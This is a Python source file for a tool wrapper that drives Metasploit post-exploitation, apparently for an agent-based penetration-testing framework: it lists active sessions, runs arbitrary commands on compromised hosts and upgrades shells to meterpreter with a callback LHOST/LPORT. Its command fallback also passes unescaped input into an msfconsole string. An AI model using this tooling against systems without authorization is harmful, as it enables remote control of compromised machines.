from tool_wrappers.base import ToolWrapper
from tool_wrappers.msf_rpc_client import MsfRpcClient


class MsfSessionWrapper(ToolWrapper):
    """Interact with active Metasploit sessions (post-exploitation).

    CRITICAL-risk: session interaction always requires user confirmation.

    Actions:
        list     – list all active sessions
        run      – run a command on a session
        upgrade  – upgrade a shell to meterpreter
    """

    tool_name = "msf_session"
    risk_level = "critical"

    VALID_ACTIONS = {"list", "run", "upgrade"}

    def run(self, params: dict) -> dict:
        action = params.get("action", "list")
        if action not in self.VALID_ACTIONS:
            raise ValueError(f"msf_session action must be one of: {', '.join(self.VALID_ACTIONS)}")

        timeout = int(params.get("timeout", 120))
        stop_callback = params.get("__stop_callback")

        if action == "list":
            return self._list_sessions(timeout, stop_callback)
        elif action == "run":
            return self._run_session_command(params, timeout, stop_callback)
        elif action == "upgrade":
            return self._upgrade_session(params, timeout, stop_callback)
        else:
            raise ValueError(f"Unknown action: {action}")

    def _list_sessions(self, timeout: int, stop_callback) -> dict:
        rpc = MsfRpcClient()
        sessions = rpc.list_sessions()

        if sessions is not None:
            session_list = []
            for sid, info in sessions.items():
                session_list.append({
                    "id": sid,
                    "type": info.get("type", ""),
                    "tunnel_local": info.get("tunnel_local", ""),
                    "tunnel_peer": info.get("tunnel_peer", ""),
                    "via_exploit": info.get("via_exploit", ""),
                    "via_payload": info.get("via_payload", ""),
                    "desc": info.get("desc", ""),
                    "info": info.get("info", ""),
                    "platform": info.get("platform", ""),
                    "arch": info.get("arch", ""),
                })
            return {
                "action": "list",
                "source": "rpc",
                "sessions": session_list,
                "count": len(session_list),
            }

        # CLI fallback
        cmd = ["msfconsole", "-q", "-x", "sessions -l; exit -y"]
        stdout = self._run_command(cmd, timeout=timeout, stop_callback=stop_callback)
        return {
            "action": "list",
            "source": "cli",
            "raw": stdout,
        }

    def _run_session_command(self, params: dict, timeout: int, stop_callback) -> dict:
        session_id = params.get("session_id")
        command = params.get("command")
        if session_id is None:
            raise ValueError("msf_session 'run' action requires 'session_id'")
        if not command:
            raise ValueError("msf_session 'run' action requires 'command'")

        rpc = MsfRpcClient()
        output = rpc.session_command(int(session_id), command)

        if output is not None:
            return {
                "action": "run",
                "source": "rpc",
                "session_id": session_id,
                "command": command,
                "output": output,
            }

        # CLI fallback
        run_cmd = f"sessions -i {session_id} -c \"{command}\"; exit -y"
        cmd = ["msfconsole", "-q", "-x", run_cmd]
        stdout = self._run_command(cmd, timeout=timeout, stop_callback=stop_callback)
        return {
            "action": "run",
            "source": "cli",
            "session_id": session_id,
            "command": command,
            "raw": stdout,
        }

    def _upgrade_session(self, params: dict, timeout: int, stop_callback) -> dict:
        session_id = params.get("session_id")
        if session_id is None:
            raise ValueError("msf_session 'upgrade' action requires 'session_id'")

        lhost = params.get("lhost", "")
        lport = params.get("lport", "4433")

        upgrade_cmd = (
            f"use post/multi/manage/shell_to_meterpreter; "
            f"set SESSION {session_id}; "
        )
        if lhost:
            upgrade_cmd += f"set LHOST {lhost}; "
        upgrade_cmd += f"set LPORT {lport}; run; exit -y"

        cmd = ["msfconsole", "-q", "-x", upgrade_cmd]
        stdout = self._run_command(cmd, timeout=timeout, stop_callback=stop_callback)

        success = "meterpreter" in stdout.lower()
        return {
            "action": "upgrade",
            "source": "cli",
            "session_id": session_id,
            "success": success,
            "raw": stdout,
        }
